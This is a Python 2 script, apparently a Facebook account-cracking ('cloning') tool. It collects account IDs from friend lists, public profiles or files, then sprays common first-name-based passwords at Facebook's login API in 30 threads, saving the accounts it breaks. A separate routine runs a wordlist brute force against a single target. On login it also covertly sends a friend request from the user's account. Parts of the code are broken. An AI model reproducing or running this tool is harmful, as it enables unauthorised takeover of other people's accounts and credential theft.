#!/usr/bin/python2

#coding=utf-8

#The Credit For This Code Goes To Mr HACKER XD

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():

	print "\x1b[1;91mExit"	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.07)

##### LOGO #####

logo = """

 

\033[1;31;40m╭━━━┳╮╱╱╱╱╱╱╱╱╭╮

\033[1;31;40m┃╭━╮┃┃╱╱╱╱╱╱╱╱┃┃

\033[1;31;40m┃╰━━┫╰━┳━━┳━━┳┫╰━╮

\033[1;31;40m╰━━╮┃╭╮┃╭╮┃╭╮┣┫╭╮┃

\033[1;31;40m┃╰━╯┃┃┃┃╰╯┃╭╮┃┃╰╯┃

\033[1;31;40m╰━━━┻╯╰┻━━┻╯╰┻┻━━╯

\033[1;31;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅๑۩Salwa۩๑▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅

\033[1;32;40m ➣Author©  → Shoaib Ali

\033[1;32;40m ➣Facebook → shoaib.ali.blouch

\033[1;32;40m ➣Github   → https://github.com/shoaibblouch

\033[1;35;40m ➣Youtube  → Technical King

\033[1;36;40m ➣ Salwa

\033[1;37;40m ➣☏        → +923377289367

\033[1;38;40m ➣ Shoaib

\033[1;39;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅

"""

###### LOGO2 ######

logo2 = """

	\033[1;32;40m ➣ Not responsible for any miss use

\033[1;32;40m  

█▀ █░█ █▀█ ▄▀█ █ █▄▄

▄█ █▀█ █▄█ █▀█ █ █▄█

█▀ ▄▀█ █░░ █░█░█ ▄▀█

▄█ █▀█ █▄▄ ▀▄▀▄▀ █▀█

"""

def tik():

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\x1b[1;93m█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

##### Pilih Login #####

def masuk():

	os.system('reset')

	print logo

	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;32m Login Fb"

	print "\033[1;91m║--\033[1;91m> \033[1;95m2.\033[1;32m Login using token"

	print "\033[1;91m║--\033[1;91m> \033[1;95m0.\033[1;31m Exit"

	print "\033[1;91m║"

	msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m")

	if msuk =="":

		print"\033[1;91m[!] Wrong input"

		keluar()

	elif msuk =="1":

		login()

	elif msuk =="2":

		tokenz()

	elif msuk =="0":

		keluar()

	else:

		print"\033[1;91m[!] Wrong input"

		keluar()

			

##### TOKEN #####

def tokenz():

	os.system('reset')

	print logo

	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		zedd = open("login.txt", 'w')

		zedd.write(toket)

		zedd.close()

		menu()

	except KeyError:

		print "\033[1;91m[!] Wrong"

		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")

		if e =="":

			keluar()

		elif e =="y":

			login()

		else:

			keluar()

			

def login():

	try:

		toket = open('login.txt','r')

		menu() 

	except (KeyError,IOError):

		os.system('clear')

		print logo2

		print'\033[1;31;40m●═══════════════════════◄►═══════════════════════●'

		print' \033[1;92mWarning: \033[1;97mDo Not Use Your Real Account' 															

		print' \033[1;92mNote   : \033[1;97mUse a Fresh Account To Login' 

		print'\033[1;36;40m●═══════════════════════◄►═══════════════════════●'	

		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;92m ➣ \x1b[1;96m')

		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;93m ➣ \x1b[1;35;40m')

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\x1b[1;96mThere is no internet connection"

			keluar()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				unikers = open("login.txt", 'w')

				unikers.write(z['access_token'])

				unikers.close()

				print '\n\x1b[1;36;40m[✓] Login Successful...'

				os.system('xdg-open https://facebook.com/shoaibblouch01')

				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.ConnectionError:

				print"\n\x1b[1;91m[!] There is no internet connection"

				keluar()

		if 'checkpoint' in url:

			print("\n\x1b[1;92m[!] Your Account is on Checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			keluar()

		else:

			print("\n\x1b[1;93mPassword/Email is wrong")

			os.system('rm -rf login.txt')

			time.sleep(1)

			login()

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\x1b[1;91m[!] Token invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)

		b = json.loads(ots.text)

		sub = str(b['summary']['total_count'])

	except KeyError:

		os.system('clear')

		print"\033[1;91mYour Account is on Checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	except requests.exceptions.ConnectionError:

		print"\x1b[1;92mThere is no internet connection"

		keluar()

	os.system("clear")

	print logo

	print "   \033[1;36;40m      ╔═════════════shoaib════════════════════╗"

	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               

	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"

	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"

	print "   \033[1;36;40m      ╚═════════════════Shoaib════════════════╝"

	print "\033[1;32;40m[1] \033[1;33;40mStart Cloning"	

	print "\033[1;32;40m[2] \033[1;33;40mUpdate Tool"																														

	print "\033[1;32;40m[0] \033[1;33;40mLogout"

	pilih()

def pilih():

	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")

	if unikers =="":

		print "\x1b[1;91mFill in correctly"

		pilih()

	elif unikers =="1":

		super()

	elif unikers =="2":

		os.system('clear')

		print logo

		print " \033[1;36;40m●═════════Shoaib═══════════════◄►════════════════════════●\n"

		os.system('git pull origin master')

		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')

		menu()

	elif unikers =="0":

		jalan('Token Removed')

		os.system('rm -rf login.txt')

		keluar()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih()

def super():

	global toket

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		print"\x1b[1;91mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	os.system('clear')

	print logo

	print "\x1b[1;32;40m[1] \033[1;33;40mCrack From Friend List"

	print "\x1b[1;32;40m[2] \033[1;33;40mCrack From Public ID"

	print "\x1b[1;32;40m[3] \033[1;33;40mTarget Bruteforce"

	print "\x1b[1;32;40m[4] \033[1;33;40mCrack From File"

	print "\x1b[1;32;40m[0] \033[1;33;40mBack"

	pilih_super()

def pilih_super():

	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")

	if peak =="":

		print "\x1b[1;91mFill in correctly"

		pilih_super()

	elif peak =="1":

		os.system('clear')

		print logo

		jalan('\033[1;93m[✺] Getting IDs \033[1;97m...')

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)

		z = json.loads(r.text)

		for s in z['data']:

			id.append(s['id'])

	elif peak =="2":

		os.system('clear')

		print logo

		idt = raw_input("\033[1;96m[*] Enter ID : ")

		try:

			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)

			op = json.loads(jok.text)

			print"\033[1;31;40m[✺] Name : "+op["name"]

		except KeyError:

			print"\x1b[1;92m[✺] ID Not Found!"

			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")

			super()

		print"\033[1;35;40m[✺] Getting IDs..."

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)

		z = json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

	elif peak =="3":

		os.system('clear')

		print logo

		brute()	

	elif peak =="4":

		os.system('clear')

		print logo                  

		try:

			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')

			for line in open(idlist,'r').readlines():

				id.append(line.strip())

		except IOError:

			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'

			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')

			super()

	elif peak =="0":

		menu()

	else:

		print "\x1b[1;91mFill in correctly"

		pilih_super()

	

	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))

	jalan('\033[1;34;40m[✺] Please Wait...')

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)

	print "\n\033[1;94m        ❈     \x1b[1;93mTo Stop Process Press CTRL+Z \033[1;94m    ❈"

	print " \033[1;31;40m●════════════════════════◄►═══════════Salwa═════════════●"

	jalan(' \033[1;93mCloning Started  Wait...')

	print  "\033[1;36;40m ●══════════════Shoaib══════════◄►════════════════════════●" 

	def main(arg):

		global cekpoint,oks

		user = arg

		try:

			os.mkdir('out')

		except OSError:

			pass 

		try:

			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)

			b = json.loads(a.text)

			pass1 = b['first_name'] + '786'

			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

			q = json.load(data)

			if 'access_token' in q:

				print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' >> ' + b['name']

				oks.append(user+pass1)

			else:

				if 'www.facebook.com' in q["error_msg"]:

					print '\x1b[1;36;40m[Checkpoint] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['name']

					cek = open("out/CP.txt", "a")

					cek.write(user+"|"+pass1+"\n")

					cek.close()

					cekpoint.append(user+pass1)

				else:

					pass2 = b['first_name'] + '123'

					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

					q = json.load(data)

					if 'access_token' in q:

						print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['name']

						oks.append(user+pass2)

					else:

						if 'www.facebook.com' in q["error_msg"]:

							print '\x1b[1;36;40m[Checkpoint] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['name']

							cek = open("out/CP.txt", "a")

							cek.write(user+"|"+pass2+"\n")

							cek.close()

							cekpoint.append(user+pass2)

						else:

							pass3 = b['first_name'] + '1122'

							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

							q = json.load(data)

							if 'access_token' in q:

								print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['name']

								oks.append(user+pass3)

							else:

								if 'www.facebook.com' in q["error_msg"]:

									print '\x1b[1;36;40m[Checkpoint] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['name']

									cek = open("out/CP.txt", "a")

									cek.write(user+"|"+pass3+"\n")

									cek.close()

									cekpoint.append(user+pass4)

								else:

									pass4 = b['first_name'] + '1234'

									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

									q = json.load(data)

									if 'access_token' in q:

										print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['name']

										oks.append(user+pass4)

									else:

										if 'www.facebook.com' in q["error_msg"]:

											print '\x1b[1;36;40m[Checkpoint] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['name']

											cek = open("out/CP.txt", "a")

											cek.write(user+"|"+pass4+"\n")

											cek.close()

											cekpoint.append(user+pass4)

										else:

											pass5 = '786786'

											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

											q = json.load(data)

											if 'access_token' in q:

												print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' >> ' + b['name']

												oks.append(user+pass5)

											else:

												if 'www.facebook.com' in q["error_msg"]:

													print '\x1b[1;36;40m[Checkpoint] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['name']

													cek = open("out/CP.txt", "a")

													cek.write(user+"|"+pass5+"\n")

													cek.close()

													cekpoint.append(user+pass5)

												else:

													pass6 = 'pubg123'

													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

													q = json.load(data)

													if 'access_token' in q:

														print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' >> ' + b['name']

														oks.append(user+pass6)

													else:

														if 'www.facebook.com' in q["error_msg"]:

															print '\x1b[1;36;40m[Checkpoint] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['name']

															cek = open("out/CP.txt", "a")

															cek.write(user+"|"+pass6+"\n")

															cek.close()

															cekpoint.append(user+pass6)

														else:

															pass7 = 'Pakistan'

															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

															q = json.load(data)

															if 'access_token' in q:

																print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' >> ' + b['name']

																oks.append(user+pass7)

															else:

																if 'www.facebook.com' in q["error_msg"]:

																	print '\x1b[1;36;40m[Checkpoint] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['name']

																	cek = open("out/CP.txt", "a")

																	cek.write(user+"|"+pass7+"\n")

																	cek.close()

																	cekpoint.append(user+pass7)

		except:																		

			pass

		

	p = ThreadPool(30)

	p.map(main, id) 

	

	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;96m....'

	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))

	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'

	print """

\033[1;31;40m ●═════════════Shoaib═══════════◄►════════════════════════●

           """

	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")

	super()

def brute():

    os.system('clear')

    try:

        toket = open('login.txt', 'r').read()

    except IOError:

        print '\x1b[1;91m[!] Token not found'

        os.system('rm -rf login.txt')

        time.sleep(0.5)

        login()

    else:

              

        os.system('clear')

        print logo

        print '\033[1;31;40m ●══════════════Shoaib══════════◄►════════════════════════●'

        try:

            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')

            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')

            total = open(passw, 'r')

            total = total.readlines()

            print '\033[1;31;40m ●═════════════Shoaib═══════════◄►════════════════════════●'

            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email

            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'

            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')

            sandi = open(passw, 'r')

            for pw in sandi:

                try:

                    pw = pw.replace('\n', '')

                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)

                    sys.stdout.flush()

                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

                    mpsh = json.loads(data.text)

                    if 'access_token' in mpsh:

                        dapat = open('Brute.txt', 'w')

                        dapat.write(email + ' | ' + pw + '\n')

                        dapat.close()

                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'

                        print 52 * '\x1b[1;97m\xe2\x95\x90'

                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email

                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw

                        keluar()

                    else:

                        if 'www.facebook.com' in mpsh['error_msg']:

                            ceks = open('Brutecekpoint.txt', 'w')

                            ceks.write(email + ' | ' + pw + '\n')

                            ceks.close()

                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'

                            print  "\033[1;36;40m ●══════════════Shoaib══════════◄►════════════════════════●"

                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'

                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email

                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw

                            keluar()

                except requests.exceptions.ConnectionError:

                    print '\x1b[1;91m[!] Connection Error'

                    time.sleep(1)

        except IOError:

            print '\x1b[1;91m[!] File not found...'

            print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""

            super()

if __name__ == '__main__':

	login()
